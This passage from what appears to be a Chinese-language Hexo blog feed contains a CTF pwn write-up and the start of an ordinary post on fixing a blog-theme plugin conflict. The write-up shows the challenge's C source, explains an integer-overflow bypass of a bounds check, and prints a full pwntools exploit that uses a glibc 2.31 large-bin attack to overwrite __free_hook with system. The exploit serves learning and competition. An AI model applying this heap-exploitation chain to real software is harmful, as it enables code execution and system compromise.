empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input offset */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;offset) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input count */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Count: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;count) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line">  <span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Edit content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(&amp;note-&gt;content[offset], count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print note */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(<span class="number">1</span>, note-&gt;content, note-&gt;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Delete note */</span></span><br><span class="line">  <span class="built_in">free</span>(note-&gt;content);</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">  note-&gt;content = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. CreateNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. EditNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. PrintNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. DeleteNote"</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> choice, index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input choice */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choice: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;choice) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (choice &lt; <span class="number">1</span> || choice &gt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input index */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;index) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Security check */</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= MAX_NOTE) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: CreateNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: EditNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: PrintNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: DeleteNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目主要漏洞在它的edit功能的安全检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Security check */</span></span><br><span class="line"><span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line"><span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line"><span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br></pre></td></tr></table></figure><p>题目在<code>offset + count</code>进行检查时，忘了在int64 中<code>0x8000000==0</code>的情况。</p><p>导致我们可以任意写，然后通过 <code>PrintNote</code>泄露出基地址。</p><p>但是，由于calloc函数，导致我们不能用tache bin 来attack。</p><p>但是由于题目没有限制chunk大小，导致我们可以利用Large bin Attack 写入<em>`</em>free_hook+0x20<code>处再创造chunk覆盖</code>__free_hook`为system。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/07 21:47:24</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./chall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.bsidesahmedabad.in'</span>,<span class="number">9003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,offset,count,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Offset:'</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    p.recvuntil(<span class="string">'Count:'</span>)</span><br><span class="line">    p.sendline(str(count))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x548</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2147483647</span><span class="number">-1</span>,<span class="string">'8'</span>*<span class="number">0x46</span>+p64(<span class="number">0x501</span>)+<span class="string">'8'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x2d8</span>,<span class="string">'x'</span>*<span class="number">0x270</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x281</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">6</span>)</span><br><span class="line">free_hook=x.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">'1'</span>*<span class="number">8</span>) <span class="comment">#p1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'2'</span>*<span class="number">8</span>)<span class="comment">#g1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">'3'</span>*<span class="number">8</span>)<span class="comment">#p2</span></span><br><span class="line"><span class="comment"># put a chunk to unsorted bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># put a chunk to large bin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x438</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment"># put a chunk to unsorted bi</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#modify bk-&gt;next of chunk p1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x38</span>, (<span class="number">0x7fffffff</span><span class="number">-0x38</span>+<span class="number">1</span>), p64(free_hook<span class="number">-0x4b</span><span class="number">-2</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">'3'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, (<span class="number">0x7fffffff</span><span class="number">-8</span>+<span class="number">1</span>),<span class="number">0x40</span>*<span class="string">'1'</span>+p64(<span class="number">0x51</span>)+p64(free_hook<span class="number">-0x30</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>,<span class="string">'3'</span>*<span class="number">0x20</span>+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.anquanke.com/post/id/244018" target="_blank" rel="noopener">https://www.anquanke.com/post/id/244018</a></p><p><a href="https://www.anquanke.com/post/id/242640#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242640#h2-2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉&lt;del&gt;~&lt;/del&gt;(◞‸◟ )tcl…）</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</title>
    <link href="lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/"/>
    <id>lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/</id>
    <published>2021-11-03T12:58:38.417Z</published>
    <updated>2022-02-22T12:22:17.129Z</updated>
    
    <content type="html"><![CDATA[<p>今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。<a id="more"></a></p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>未安装live2d且不蒜子配置正常，执行<code>npm install --save hexo-helper-live2d</code>后，不蒜子计数冲突不显示计数。<br>已安装live2d但<code>live2d.enable</code>由<code>true</code>改为<code>false</code>后，不蒜子显示计数。</p><p>同时正常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>异常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.打开footer.ejs文件，找到与不蒜子相关的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_site_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>2.删除<code>&lt;span id=&quot;busuanzi_container_page_pv&quot; style=&#39;display:inline&#39;&gt;</code>和<code>&lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:inline&#39;&gt;</code>语句。</p><p>3.在<code>&lt;% if (theme.visit_counter.on) { %&gt;</code>语句后，添加<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     &lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">&lt;script async&#x3D;&quot;&quot; src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">         &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     